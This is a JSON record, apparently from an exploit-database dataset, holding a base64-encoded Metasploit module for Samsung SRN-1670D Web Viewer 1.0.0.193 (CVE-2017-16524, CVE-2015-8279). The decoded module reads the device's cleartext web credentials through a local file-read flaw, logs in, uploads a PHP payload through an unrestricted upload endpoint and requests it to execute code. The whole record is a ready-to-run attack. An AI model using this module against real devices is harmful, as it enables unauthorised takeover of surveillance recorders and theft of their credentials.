{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBVbnJlc3RyaWN0ZWQgZmlsZSB1cGxvYWQgdnVsbmVyYWJpbGl0eSAtIFdlYiBWaWV3ZXIgMS4wLjAuMTkzIG9uIFNhbXN1bmcgU1JOLTE2NzBEDQojIERhdGU6IDIwMTctMDYtMTkNCiMgRXhwbG9pdCBBdXRob3I6IE9tYXIgTUVaUkFHIC0gMHhGRkZGRkYgLyB3d3cucmVhbGlzdGljLXNlY3VyaXR5LmNvbQ0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vd3d3LmhhbndoYXNlY3VyaXR5LmNvbQ0KIyBWZXJzaW9uOiBXZWIgVmlld2VyIDEuMC4wLjE5MyBvbiBTYW1zdW5nIFNSTi0xNjcwRA0KIyBUZXN0ZWQgb246IFdlYiBWaWV3ZXIgMS4wLjAuMTkzIA0KIyBDVkUgOiBDVkUtMjAxNy0xNjUyNA0KIyMNCiMjDQojIFRoaXMgbW9kdWxlIHJlcXVpcmVzIE1ldGFzcGxvaXQ6IGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyBDdXJyZW50IHNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQpyZXF1aXJlICdkaWdlc3QnDQoNCmNsYXNzIE1ldGFzcGxvaXRNb2R1bGUgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICAJDQogIAlSYW5rID0gR29vZFJhbmtpbmcNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlBocEVYRQ0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCSAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCSAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1NhbXN1bmcgU1JOLTE2NzBEIC0gV2ViIFZpZXdlciBWZXJzaW9uIDEuMC4wLjE5MyBBcmJpdHJhcnkgRmlsZSBSZWFkICYgVXBsb2FkJywNCgkgICAgICAnRGVzY3JpcHRpb24nICAgID0+ICVxew0KCQlUaGlzIG1vZHVsZSBleHBsb2l0cyBhbiBVbnJlc3RyaWN0ZWQgZmlsZSB1cGxvYWQgdnVsbmVyYWJpbGl0eSBpbiANCgkJV2ViIFZpZXdlciAxLjAuMC4xOTMgb24gU2Ftc3VuZyBTUk4tMTY3MEQgZGV2aWNlczogJ25ldHdvcmtfc3NsX3VwbG9hZC5waHAnIA0KCQlhbGxvd3MgcmVtb3RlIGF1dGhlbnRpY2F0ZWQgYXR0YWNrZXJzIHRvIHVwbG9hZCBhbmQgZXhlY3V0ZSBhcmJpdHJhcnkNCgkJUEhQIGNvZGUgdmlhIGEgZmlsZW5hbWUgd2l0aCBhIC5waHAgZXh0ZW5zaW9uLCB3aGljaCBpcyB0aGVuIGFjY2Vzc2VkIHZpYSBhDQoJCWRpcmVjdCByZXF1ZXN0IHRvIHRoZSBmaWxlIGluIHRoZSB1cGxvYWQvIGRpcmVjdG9yeS4gDQoJCVRvIGF1dGhlbnRpY2F0ZSBmb3IgdGhpcyBhdHRhY2ssIG9uZSBjYW4gb2J0YWluIHdlYi1pbnRlcmZhY2UgY3JlZGVudGlhbHMgDQoJCWluIGNsZWFydGV4dCBieSBsZXZlcmFnaW5nIHRoZSBleGlzdGluZyBMb2NhbCBGaWxlIFJlYWQgVnVsbmVyYWJpbGl0eSANCgkJcmVmZXJlbmNlZCBhcyBDVkUtMjAxNS04Mjc5LCB3aGljaCBhbGxvd3MgcmVtb3RlIGF0dGFja2VycyB0byByZWFkIHRoZSANCgkJd2ViIGludGVyZmFjZSBjcmVkZW50aWFscyB2aWEgYSByZXF1ZXN0IGZvciB0aGUNCgkJY3Nsb2dfZXhwb3J0LnBocD9wYXRoPS9yb290L3BocF9tb2R1bGVzL2xpZ2h0dHBkL3NiaW4vdXNlcnB3IFVSSS4NCgkgICAgICB9LA0KDQoJICAgICAgJ0F1dGhvcicgICAgICAgICA9PiBbDQoJCSdPbWFyIE1lenJhZyA8b21hci5tZXpyYWdAcmVhbGlzdGljLXNlY3VyaXR5LmNvbT4nLCAgIyBAXzB4RkZGRkZGDQoJICAgICAgICAnUmVhbGlzdGljIFNlY3VyaXR5JywNCgkgICAgICAgICdBbGdlcmlhJw0KCSAgICAgICBdLA0KCSAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQoJICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KCSAgICAgICAgWw0KCSAgICAgICAgICBbICdDVkUnLCAnMjAxNy0xNjUyNCcgXSwNCgkgICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vZ2l0aHViLmNvbS9yZWFsaXN0aWMtc2VjdXJpdHkvQ1ZFLTIwMTctMTY1MjQnIF0sDQoJICAgICAgICAgIFsgJ0NWRScsICcyMDE1LTgyNzknIF0sDQoJICAgICAgICAgIFsgJ1VSTCcsICdodHRwOi8vYmxvZy5lbWF6ZS5uZXQvMjAxNi8wMS9tdWx0aXBsZS12dWxuZXJhYmlsaXRpZXMtc2Ftc3VuZy1zcm4uaHRtbCcgXQ0KCSAgICAgICAgXSwNCgkgICAgICAnUHJpdmlsZWdlZCcgICAgID0+IHRydWUsDQoJICAgICAgJ0FyY2gnICAgICAgICAgICA9PiBBUkNIX1BIUCwNCgkgICAgICAnUGxhdGZvcm0nICAgICAgID0+ICdwaHAnLA0KCSAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCgkgICAgICAgIFsNCgkJCVsnU2Ftc3VuZyBTUk4tMTY3MEQgPT0gMS4wLjAuMTkzJywge31dDQoJICAgICAgICBdLA0KCSAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCwNCgkgICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdNYXIgMTQgMjAxNycNCgkgICAgKSkNCg0KCSAgICByZWdpc3Rlcl9vcHRpb25zKA0KCSAgICAgIFsNCgkgICAgICAgIE9wdFN0cmluZy5uZXcoJ1JIT1NUJywgWyB0cnVlLCAnVGhlIHRhcmdldCBhZGRyZXNzLicgXSksDQoJCU9wdFN0cmluZy5uZXcoJ1JQT1JUJywgWyB0cnVlLCAnVGhlIHRhcmdldCBwb3J0IChUQ1ApLicsICc4MCcgXSksDQoJICAgICAgXSkNCgllbmQNCg0KDQoJZGVmIGNoZWNrDQoJCSMNCgkJcHJpbnRfc3RhdHVzKCdDaGVja2luZyB2ZXJzaW9uLi4uJykgDQoNCgkgCXJlc3AgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCSd1cmknICAgICA9PiAgIi9pbmRleCIsDQoJCQkndmVyc2lvbicgPT4gJzEuMScsDQoJCQknbWV0aG9kJyA9PiAnR0VUJywNCgkJCSdoZWFkZXJzJyA9Pg0KCQkJCXsNCgkJCQkgICAnVXNlci1BZ2VudCcgPT4gIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA2LjApIg0KCQkJCX0NCgkgICAgICAgIH0pDQoJICAgIA0KCQl1bmxlc3MgcmVzcA0KCQkJcHJpbnRfZXJyb3IoIkNvbm5lY3Rpb24gdGltZWQgb3V0LiIpDQoJCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQoJCWVuZA0KCQkjICAgICAgICA8IS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAgIEZpbGUgVmVyc2lvbiAxLjAuMC4xOTMgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0+DQoJCXZlcnNpb24gPSBuaWwNCgkJaWYgcmVzcCBhbmQgcmVzcC5jb2RlID09IDIwMCAgYW5kIHJlc3AuYm9keS5tYXRjaCgvV2ViIFZpZXdlciBmb3IgU2Ftc3VuZyBOVlIvKQ0KCQkJCWlmIHJlc3AuYm9keSA9fiAvRmlsZSBWZXJzaW9uIChcZCtcLlxkK1wuXGQrXC5cZCspLw0KCQkJCQl2ZXJzaW9uID0gJDENCgkJCQkJaWYgdmVyc2lvbiA9PSAnMS4wLjAuMTkzJw0KCQkJCQkJcHJpbnRfZ29vZCAiRm91bmQgdmVzcmlvbjogI3t2ZXJzaW9ufSINCgkJCQkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkFwcGVhcnMNCgkJCQkJZW5kDQoJCQkJZW5kDQoJCWVuZA0KDQoJCUV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KDQoJZW5kDQoNCiAgCWRlZiBleHBsb2l0DQoNCgkgDQoJCXByaW50X3N0YXR1cygnT2J0YWluaW5nIGNyZWRlbnRhaWxzLi4uJykgDQoJIA0KCSAJcmVzcCA9IHNlbmRfcmVxdWVzdF9jZ2koew0KCQkJJ3VyaScgICAgID0+ICAiL2NzbG9nX2V4cG9ydC5waHAiLA0KCQkJJ3ZlcnNpb24nID0+ICcxLjEnLA0KCQkJJ21ldGhvZCcgPT4gJ0dFVCcsDQoJCQkndmFyc19nZXQnPT4NCgkJCQl7DQoJCQkJJ3BhdGgnID0+ICcvcm9vdC9waHBfbW9kdWxlcy9saWdodHRwZC9zYmluL3VzZXJwdycsDQoJCQkJJ2ZpbGUnID0+ICdmb28nDQoJCQkJfSwNCgkJCSdoZWFkZXJzJyA9Pg0KCQkJCXsNCgkJCQkgICAnVXNlci1BZ2VudCcgPT4gIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA2LjApIg0KCQkJCX0NCgkgICAgICAgIH0pDQoJCQ0KCQl1bmxlc3MgcmVzcA0KCQkJcHJpbnRfZXJyb3IoIkNvbm5lY3Rpb24gdGltZWQgb3V0LiIpDQoJCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQoJCWVuZA0KDQoJCWlmIHJlc3AgYW5kIHJlc3AuY29kZSA9PSAyMDAgYW5kIHJlc3AuYm9keSAhfiAvQXV0aGVudGljYXRpb24gaXMgZmFpbGVkLyBhbmQgcmVzcC5ib2R5ICF+IC9GaWxlIG5vdCBmb3VuZC8NCgkJCXVzZXJuYW1lID0gIHJlc3AuYm9keS5zcGxpdCgnOicpWzBdDQoJCQlwYXNzd29yZCA9ICByZXNwLmJvZHkuc3BsaXQoJzonKVsxXS5nc3ViKCIKIiwnJykNCgkJCXByaW50X2dvb2QgIkNyZWRlbnRpYWxzIG9idGFpbmVkIHN1Y2Nlc3NmdWxseTogI3t1c2VybmFtZX06I3twYXNzd29yZH0iDQoJCQkJDQoNCgkJCQlkYXRhMSA9IFJleDo6VGV4dC5lbmNvZGVfYmFzZTY0KCIje3VzZXJuYW1lfSIpDQoJCQkJZGF0YTIgPSBEaWdlc3Q6OlNIQTI1Ni5oZXhkaWdlc3QoIiN7cGFzc3dvcmR9IikNCg0KCQkJCXJhbmRmbG9hdCAgPSBSYW5kb20ubmV3DQoJCQkJZGF0YTMgPSAgcmFuZGZsb2F0LnJhbmQoMC45KQ0KCQkJCWRhdGE0ID0gZGF0YTMNCg0KCQkJCXByaW50X3N0YXR1cygnTG9nZ2luZy4uLicpIA0KDQoJCQkgCXJlc3AgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCQkJJ3VyaScgICAgID0+ICAiL2xvZ2luIiwNCgkJCQkJJ3ZlcnNpb24nID0+ICcxLjEnLA0KCQkJCQknbWV0aG9kJyA9PiAnUE9TVCcsDQoJCQkJCSd2YXJzX3Bvc3QnPT4NCgkJCQkJCXsNCgkJCQkJCQknZGF0YTEnID0+IGRhdGExLA0KCQkJCQkJCSdkYXRhMicgPT4gZGF0YTIsDQoJCQkJCQkJJ2RhdGEzJyA9PiBkYXRhMywNCgkJCQkJCQknZGF0YTQnID0+IGRhdGE0DQoJCQkJCQl9LA0KCQkJCQknaGVhZGVycycgPT4NCgkJCQkJCXsNCgkJCQkJCSAgICdVc2VyLUFnZW50JyA9PiAiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDYuMCkiLA0KCQkJCQkJICAgJ0ROVCcgPT4gIjEiLA0KCQkJCQkJICAgJ0Nvb2tpZScgPT4gIklFU0VWRU49MSINCgkJCQkJCX0NCgkJCQl9KQ0KDQoJCQkJdW5sZXNzIHJlc3ANCgkJCQkJcHJpbnRfZXJyb3IoIkNvbm5lY3Rpb24gdGltZWQgb3V0LiIpDQoJCQkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCgkJCQllbmQNCgkJCQkNCgkJCQlpZiByZXNwIGFuZCByZXNwLmNvZGUgPT0gMjAwICBhbmQgcmVzcC5ib2R5ICF+IC9JRCBpbmNvcnJlY3RlLyAgYW5kIHJlc3AuYm9keSA9fiAvc2V0Q29va2llXCgnTlZSX0RBVEExLw0KDQoJCQkJCXByaW50X2dvb2QoJ0F1dGhlbnRpY2F0aW9uIFN1Y2NlZWRlZCcpIA0KDQoJCQkJCW52cl9kMSA9ICQxIGlmIHJlc3AuYm9keSA9fiAvc2V0Q29va2llXCgnTlZSX0RBVEExJywgJyhcZFwuXGQrKScvDQoJCQkJCW52cl9kMiA9ICQxIGlmIHJlc3AuYm9keSA9fiAvc2V0Q29va2llXCgnTlZSX0RBVEEyJywgJyhcZCspJy8NCgkJCQkJbnZyX2QzID0gJDEgaWYgcmVzcC5ib2R5ID1+IC9zZXRDb29raWVcKCdOVlJfREFUQTMnLCAnKDB4XGhcaCknLw0KCQkJCQludnJfZDQgPSAkMSBpZiByZXNwLmJvZHkgPX4gL3NldENvb2tpZVwoJ05WUl9EQVRBNCcsICcoMHhcaFxoKScvDQoJCQkJCW52cl9kNyA9ICQxIGlmIHJlc3AuYm9keSA9fiAvc2V0Q29va2llXCgnTlZSX0RBVEE3JywgJyhcZCknLw0KCQkJCQludnJfZDggPSAkMSBpZiByZXNwLmJvZHkgPX4gL3NldENvb2tpZVwoJ05WUl9EQVRBOCcsICcoXGQpJy8NCgkJCQkJbnZyX2Q5ID0gJDEgaWYgcmVzcC5ib2R5ID1+IC9zZXRDb29raWVcKCdOVlJfREFUQTknLCAnKDB4XGhcaCknLw0KDQoJCQkJCWNvb2tpZSA9ICJJRVNFVkVOPTE7IE5WUl9EQVRBMT0je252cl9kMX07IE5WUl9EQVRBMj0je252cl9kMn07IE5WUl9EQVRBMz0je252cl9kM307IE5WUl9EQVRBND0je252cl9kNH07IE5WUl9EQVRBNz0je252cl9kN307IE5WUl9EQVRBOD0je252cl9kOH07IE5WUl9EQVRBOT0je252cl9kOX0iDQoNCgkJCQkJcGF5bG9hZF9uYW1lID0gIiN7cmFuZF90ZXh0X2FscGhhKDgpfS5waHAiDQoNCgkJCQkJcHJpbnRfc3RhdHVzKCJHZW5lcmF0aW5nIHBheWxvYWRbICN7cGF5bG9hZF9uYW1lfSBdLi4uIikgDQoNCgkJCQkJcGhwX3BheWxvYWQgPSBnZXRfd3JpdGVfZXhlY19wYXlsb2FkKDp1bmxpbmtfc2VsZj0+dHJ1ZSkNCgkJCQkNCgkJCQkJcHJpbnRfc3RhdHVzKCdVcGxvYWRpbmcgcGF5bG9hZC4uLicpIA0KDQoJCQkJCWRhdGEgPSBSZXg6Ok1JTUU6Ok1lc3NhZ2UubmV3DQoJCQkJCWRhdGEuYWRkX3BhcnQoIjIiLCBuaWwsIG5pbCwgJ2Zvcm0tZGF0YTsgbmFtZT0iaXNfYXBwbHkiJykNCgkJCQkJZGF0YS5hZGRfcGFydCgiMSIsIG5pbCwgbmlsLCAnZm9ybS1kYXRhOyBuYW1lPSJpc0luc3RhbGwiJykNCgkJCQkJZGF0YS5hZGRfcGFydCgiMCIsIG5pbCwgbmlsLCAnZm9ybS1kYXRhOyBuYW1lPSJpc0NlcnRGbGFnIicpDQoJCQkJCWRhdGEuYWRkX3BhcnQocGhwX3BheWxvYWQsICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsIG5pbCwgImZvcm0tZGF0YTsgbmFtZT0iYXR0YWNoRmlsZSI7IGZpbGVuYW1lPSIje3BheWxvYWRfbmFtZX0iIikNCgkJCQkJcG9zdF9kYXRhID0gZGF0YS50b19zDQoNCgkJCQkJcmVzcCA9IHNlbmRfcmVxdWVzdF9jZ2koew0KDQoJCQkJCQkndXJpJyAgICAgID0+IG5vcm1hbGl6ZV91cmkoJy9uZXR3b3JrX3NzbF91cGxvYWQucGhwJyksDQoJCQkJCQknbWV0aG9kJyAgID0+ICdQT1NUJywNCgkJCQkJCSd2YXJzX2dldCcgPT4gDQoJCQkJCQkJew0KCQkJCQkJCSdsYW5nJyA9PiAnZW4nDQoJCQkJCQkJfSwNCgkJCQkJCSdoZWFkZXJzJyA9Pg0KCQkJCQkJCXsNCgkJCQkJCQkgICAnVXNlci1BZ2VudCcgPT4gIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA2LjApIg0KCQkJCQkJCX0sDQoJCQkJCQknY3R5cGUnICAgID0+ICJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0je2RhdGEuYm91bmR9IiwNCgkJCQkJCSdjb29raWUnICAgPT4gY29va2llLA0KCQkJCQkJJ2RhdGEnICAgICA9PiBwb3N0X2RhdGENCg0KCQkJCQkgICAgfSkNCg0KCQkJCQl1bmxlc3MgcmVzcA0KCQkJCQkJcHJpbnRfZXJyb3IoIkNvbm5lY3Rpb24gdGltZWQgb3V0LiIpDQoJCQkJCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQoJCQkJCWVuZA0KDQoJCQkJCWlmIHJlc3AgYW5kIHJlc3AuY29kZSA9PSAyMDAgDQoJCQkJCQlwcmludF9zdGF0dXMoJ0V4ZWN1dGluZyBwYXlsb2FkLi4uJykgDQoJCQkJCQl1cGxvYWRfdXJpID0gbm9ybWFsaXplX3VyaSgiL3VwbG9hZC8iICsgcGF5bG9hZF9uYW1lKQ0KCQkJCQkJc2VuZF9yZXF1ZXN0X2NnaSh7DQoJCQkJCQkJJ3VyaScgICAgPT4gdXBsb2FkX3VyaSwNCgkJCQkJCQknbWV0aG9kJyA9PiAnR0VUJw0KCQkJCQkJfSw1KQ0KDQoJCQkJCQl1bmxlc3MgcmVzcA0KCQkJCQkJCXByaW50X2Vycm9yKCJDb25uZWN0aW9uIHRpbWVkIG91dC4iKQ0KCQkJCQkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCgkJCQkJCWVuZA0KDQoJCQkJCQlpZiByZXNwIGFuZCByZXNwLmNvZGUgIT0gMjAwDQoJCQkJCQkJcHJpbnRfZXJyb3IoIkZhaWxlZCB0byB1cGxvYWQiKQ0KCQkJCQkJZW5kDQoNCgkJCQkJZWxzZQ0KCQkJCQkJcHJpbnRfZXJyb3IoIkZhaWxlZCB0byB1cGxvYWQiKQ0KCQkJCQllbmQNCgkJCQllbHNlDQoJCQkJCXByaW50X2Vycm9yKCJBdXRoZW50aWNhdGlvbiBmYWlsZWQiKQ0KCQkJCWVuZA0KCQkJDQoJCWVsc2UNCgkJCXByaW50X2Vycm9yICJFcnJvciBvYnRhaW5pbmcgY3JlZGVudGFpbHMiDQoJCWVuZA0KCWVuZA0KZW5k", 
    "id": "43138", 
    "cves": [
        "CVE-2017-16524", 
        "CVE-2015-8279"
    ]
}